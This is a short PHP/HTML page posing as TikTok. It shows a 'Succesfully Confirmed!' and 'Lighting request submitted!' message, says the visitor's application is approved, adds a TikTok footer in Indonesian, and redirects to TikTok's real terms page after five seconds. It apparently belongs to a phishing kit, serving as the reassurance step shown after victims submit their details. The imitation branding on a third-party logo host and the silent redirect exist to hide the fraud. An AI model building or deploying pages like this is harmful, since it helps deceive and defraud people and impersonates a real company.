<?php




header("refresh:5;url=https://www.tiktok.com/legal/terms-of-use?lang=id-ID");


?>


<html>
  <head>
  <meta charset="utf-8">
  <title>Succesfully Confirmed!</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="shortcut icon" href="https://liveatpc.com/wp-content/uploads/2018/08/logo.png">
  </head>
  
  <body style="padding:0px; margin:0px; background: #fafafa;">
 
 <div style="margin:0px; padding:0px; background:white;border-bottom:1px solid #dedede; width:100%;">

 <img src="https://liveatpc.com/wp-content/uploads/2018/08/logo.png" width=175 style="margin:6px;"><br><br>
 
         </div>
		 <center>
		 <br><br><br>
		<div style="padding:0px; margin:0px; width:89%; background-color:white; border:1px solid #cecece;">
	<br>	<img src="https://liveatpc.com/wp-content/uploads/2018/08/logo.png" width=100 style="border-radius:50%;">
		<br><br>
		<h1 style="font-size:25px; width:99%;font-family:sans-serif;font-weight:400; ">Lighting request submitted!
		</h1>
		
		<p style="font-family:sans-serif;color:#555; width:89%;" >
		Thank you for contacting us. Your application has been approved. We will contact you as soon as possible.</p>
		</div>
		 
		 
		 
		  <div style="font-family:sans-serif; font-size:14px; color:#999;"><br>
TikTok.com
<br>
 © TikTok memiliki kantor di seluruh dunia termasuk Los Angeles, New York, London, Paris, Berlin, Dubai, Mumbai, Singapura, Jakarta, Seoul, dan Tokyo.</div>
		 
		 
		 
		 
		 
		 
  </center>
  </body>
  
  




</html>